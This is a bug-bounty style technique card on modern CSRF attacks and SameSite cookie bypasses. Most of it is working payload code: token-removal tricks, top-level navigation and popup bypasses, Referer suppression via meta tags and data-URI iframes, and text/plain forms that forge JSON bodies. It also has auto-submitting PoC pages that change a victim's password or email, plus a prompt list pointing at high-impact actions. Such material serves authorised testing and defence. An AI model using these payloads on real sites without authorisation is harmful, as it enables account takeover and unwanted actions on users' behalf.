---
id: "csrf-modern"
title: "CSRF - Modern Techniques & SameSite Bypass"
type: "technique"
category: "web-application"
subcategory: "csrf"
tags: ["csrf", "samesite", "token-bypass", "cross-origin", "deep-dig"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["account-takeover", "cors-misconfiguration", "open-redirect"]
updated: "2026-03-30"
---

## Overview

CSRF forces authenticated users to perform actions they didn't intend. While SameSite cookies have reduced classic CSRF, many bypasses exist. Payout: $500-$5k, higher when chained with account takeover or privilege escalation.

## Token Bypass Techniques

```
# Empty token — remove the CSRF token parameter entirely
# Static token — reuse any valid token (not per-session)
# Swap method — POST has CSRF protection, GET doesn't
# Token in cookie — set via CRLF injection or subdomain XSS
# Delete token parameter — some apps only validate IF present
# Change Content-Type — application/json may skip CSRF check
```

## SameSite Cookie Bypass

```
# SameSite=Lax allows GET cross-site (default since Chrome 80)
# Turn POST action into GET:
<a href="https://target.com/change-email?email=attacker@evil.com">Click</a>

# Top-level navigation (SameSite=Lax allows this)
<script>window.location = 'https://target.com/delete-account';</script>

# Popup window (treated as top-level navigation)
window.open('https://target.com/api/action?param=evil');

# Subdomain XSS → set cookies for parent domain
# If *.target.com has XSS, set SameSite=None cookie

# OAuth redirect chain (cross-site via OAuth flow)
# Some OAuth flows involve cross-site redirects that carry cookies

# WebSocket (no SameSite protection)
# WebSocket connections from evil.com to target.com carry cookies
```

## Referer-Based CSRF Bypass

```html
<!-- Suppress Referer header entirely -->
<meta name="referrer" content="no-referrer">
<form action="https://target.com/action" method="POST">
  <input name="email" value="attacker@evil.com">
</form>

<!-- Referer validation only checks presence of domain -->
<!-- https://evil.com/csrf?target.com works -->

<!-- Referer with data: URI (no referer sent) -->
<iframe src="data:text/html,<form action='https://target.com/api' method='POST'><input name='x' value='y'><script>document.forms[0].submit()</script></form>">
```

## Content-Type Manipulation

```html
<!-- Change from application/json to text/plain (often bypasses CSRF) -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","x":"' value='y"}'>
</form>
<!-- Sends body: {"email":"attacker@evil.com","x":"=y"} -->

<!-- Flash-based Content-Type override (legacy but still works some places) -->
<!-- Use fetch with no-cors mode for simple requests -->
```

## CSRF PoC Templates

```html
<!-- Auto-submit form -->
<html><body>
<form id="f" action="https://target.com/change-password" method="POST">
  <input name="new_password" value="hacked123">
  <input name="confirm_password" value="hacked123">
</form>
<script>document.getElementById('f').submit();</script>
</body></html>

<!-- JSON CSRF via fetch (if CORS allows or no preflight needed) -->
<script>
fetch('https://target.com/api/update', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
</script>
```

## Deep Dig Prompts

```
Given this application's CSRF protection [describe tokens, SameSite, Referer checks]:
1. Test token removal, empty token, and token reuse across sessions.
2. Check if changing request method (POST→GET) bypasses protection.
3. Test SameSite bypass via top-level navigation, popups, and subdomain XSS.
4. Try Content-Type manipulation (text/plain, multipart/form-data).
5. Check Referer validation — does it fail open when Referer is absent?
6. Identify high-impact actions (password change, email change, role change) and target those.
```

## Tools

- **Burp Suite** — CSRF PoC generator (right-click → Engagement tools)
- **CSRFtester** — OWASP CSRF testing tool
